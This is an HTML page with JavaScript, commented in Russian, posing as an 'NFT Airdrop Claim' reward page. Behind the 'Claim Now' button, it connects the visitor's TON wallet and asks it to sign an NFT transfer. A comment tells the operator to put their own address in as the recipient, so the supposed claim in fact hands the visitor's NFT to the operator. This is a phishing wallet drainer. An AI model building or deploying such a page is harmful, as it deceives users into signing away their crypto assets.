<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Claim Reward</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #111; color: #fff; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; border: none; border-radius: 10px; color: white; }
    </style>
</head>
<body>
    <h1>NFT Airdrop Claim</h1>
    <div id="ton-connect"></div>
    <button id="claim-btn">Claim Now</button>

    <script>
        const tonConnectUI = new TonConnectUI({
            manifestUrl: 'https://newifi.onrender.com/tonconnect-manifest.json'
        });

        const params = new URLSearchParams(window.location.search);
        const nftAddress = params.get('nft');

        document.getElementById('claim-btn').onclick = async () => {
            if (!nftAddress) return alert("Ошибка: NFT не найден");

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: [{
                    address: nftAddress,
                    amount: '50000000', // 0.05 TON за газ
                    // Payload ниже — это стандартный вызов transfer (op=0x5fcc3d14)
                    // ТЕБЕ НУЖНО ЗАМЕНИТЬ АДРЕС ПОЛУЧАТЕЛЯ на свой (UQATIz...)
                    payload: 'te6cckEBAQEAAgAAAEAw' 
                }]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                alert("Транзакция отправлена!");
            } catch (e) {
                console.error(e);
            }
        };
    </script>
</body>
</html>
